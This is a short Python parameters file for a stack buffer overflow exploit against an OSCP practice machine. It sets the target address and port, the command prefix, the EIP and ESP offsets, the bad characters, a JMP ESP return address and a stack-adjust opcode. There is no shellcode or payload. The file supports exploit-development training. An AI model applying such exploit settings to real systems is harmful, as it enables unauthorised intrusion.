# PARAMETERS.py
# This is the files with all the variables
# This has been designed for the OSCP buffer overflow machine

RHOST = "192.168.17.139"
RPORT = 1337

#In case machine needs prepend a name, such as with vuln server and oscp guide
pre_buffer_name = "OVERFLOW3 "

# Total length of the buffer to send
buf_totlen = 1500

# Offset at which the EIP is overwritten
offset_eip = 1274

# Offset at which the ESP is overwritten
offset_esp = 1278

# Badchars sequence, comma-separated
badchars = [0x00, 0x11, 0x40, 0x5f, 0x60, 0xb8, 0xb9, 0xee, 0xef]
# badchars = [0x00, 0x04, 0x05, 0xA2, 0xA3, 0xAC, 0xAD, 0xC0, 0xC1, 0xEF, 0xF0]

# Generate the string
badchar_sequence = bytes(c for c in range(256) if c not in badchars)

# Address of the JMP ESP operation
ptr_jmp_esp = 0x62501203

# To avoid setting a nop sled
sub_esp_10 = b"\x83\xec\x10"
